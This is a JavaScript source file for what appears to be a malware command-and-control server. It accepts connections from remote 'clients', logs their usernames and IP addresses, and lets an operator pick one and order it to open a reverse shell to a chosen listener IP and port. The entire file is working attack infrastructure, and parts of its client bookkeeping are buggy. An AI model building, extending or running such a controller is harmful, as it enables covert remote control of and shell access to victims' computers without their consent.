import net from 'net';
import chalk from 'chalk';
import readline from 'readline';

const port = 8069;

class TextBuffer {
        constructor() {
                this.content = "";
        }

        get() {
                return this.content;
        }

        add(text) {

                this.content += `${text}\n`;
        }

        flush() {
                this.content = '';
        }
}

class InfoBuffer extends TextBuffer {
	add(text) {
		if (text.toLowerCase().includes("error")) {
			this.content += chalk.hex('red').bold(text + '\n')
		} else {
			this.content += chalk.hex('green')(text + '\n')
		}
	}
}

class Client {
    constructor(socket, id) {
	    this.socketObject = socket;
		this.id = id;
		this.username = "";
		this.hostname = "";
		this.initialized = false;
	}
	initialize(username, hostname) {
		this.username = username;
		this.hostname = hostname;
		this.initialized = true;
	}
}

const idClientMap = {};
const clientIdMap = {};
const socketIdMap = {};
const socketIndexMap = {};
const infoBuffer = new InfoBuffer();
var clients = [];

function updateMaps() {
        for (let i=0;i<clients.length;i++) {
		let client = clients[i];
                clientIdMap[client] = client.id;
                idClientMap[client.id] = client;
                socketIdMap[client.socketObject] = client.id;
		socketIndexMap[i] = client;

        }
}

function promptUser(question) {
        return new Promise((resolve) => {
                const rl = readline.createInterface({
                        input: process.stdin,
                        output: process.stdout
                });

                rl.question(question, (answer) => {
                        rl.close();
                        resolve(answer);
                });
        });
}

async function main() {
	console.log("Hello!");
	var clientSelected;
	while (true) {
		clientSelected = "";
		let input = await promptUser(">>");
		let splitInput = input.split(" ")
		switch(splitInput[0]) {
		   	case "list":
				for (let client of clients) {
					let initializedString =!client.initialized? "UNINITALIZED  |  " : "";

					console.log(`${clientIdMap[client]} : ${client.username}@${client.hostname}`);

				}
				break;
			case 'set': 
				clientSelected = splitInput[1];
				if (idClientMap[clientSelected]) {
					const client = idClientMap[clientSelected];
					console.log(`Selected client with id ${clientSelected}`);
					while (clientSelected != "" && idClientMap[clientSelected]) {
						let clientInput = await promptUser(`${clientSelected}>>`);
						let clientInputSplit = clientInput.split(" ");
						switch (clientInputSplit[0]) {
							case 'shell':
								let listenerIP = await promptUser("What IP should the client shell connect to?");
								let listenerPort = await promptUser("What port should the client shell connect to?");
								client.socketObject.write(`shell|${JSON.stringify({ip: listenerIP, port: listenerPort})}`);
								break;
							case 'EXIT':
								clientSelected = '';
								break;
						}

					}

				} else {
					console.log(`No such user ${clientSelected}.`);
				}
				break;
			case 'EXIT':
				for (let client of clients) {
					client.socketObject.write('exit|{}');	
				}
				process.exit(0);
				break;

		}
	}
}


// Create TCP server
const server = net.createServer((socket) => {
	const id = Math.random().toString(36).substring(7);
	let newClient = new Client(socket, id);
	clients.push(newClient);
	updateMaps();
	console.log('added client')
	console.log(newClient)

	socket.on('end', () => {
		updateMaps()
		infoBuffer.add(`Client ${idClientMap[socketIdMap[socket]].username} has disconnected.`);
		clients.splice(socketIndexMap[socket], 1);
    	});
	socket.on('data', (data) => {
		const splitWholeData = data.toString().split("|");
		const eventName = splitWholeData[0]
		const eventData = JSON.parse(splitWholeData[1])
		switch (eventName) {
			case 'initialization':
				const client = idClientMap[socketIdMap[socket]];
				client.initialize(eventData.username, socket.remoteAddress);
				infoBuffer.add(`Client ${idClientMap[socketIdMap[socket]].username} has been initialized.`);
		}
	});

    socket.on('error', (err) => {
        console.error('Socket error:', err);
    });
});

server.listen(port, () => {
    main()
});

process.on('SIGINT', () => {
	console.log(chalk.red.bold('\n\nReceived SIGINT. Performing cleanup. \n Please note that the "EXIT" command is provided for a more elegant approach.'));
	for (let client of clients) {
		client.socketObject.write('exit|{}');	
	}
	process.exit(0);
});

